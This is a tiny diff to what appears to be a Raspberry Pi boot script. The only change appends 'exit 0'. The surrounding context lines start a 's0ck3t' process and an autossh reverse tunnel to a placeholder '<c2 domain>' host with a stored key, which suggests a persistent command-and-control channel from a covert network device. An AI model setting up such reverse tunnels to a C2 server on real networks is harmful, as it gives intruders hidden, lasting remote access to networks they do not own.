@@ -19,3 +19,4 @@ fi
 #/usr/local/bin/noip2
 s0ck3t <n0d3 port> &
 autossh -fN -R <ptdb port>:localhost:<c2 port for ptdb> <c2 user>@<c2 domain> -p <c2 port for com> -i /home/pi/.ssh/<nodename_rsa> &
+exit 0
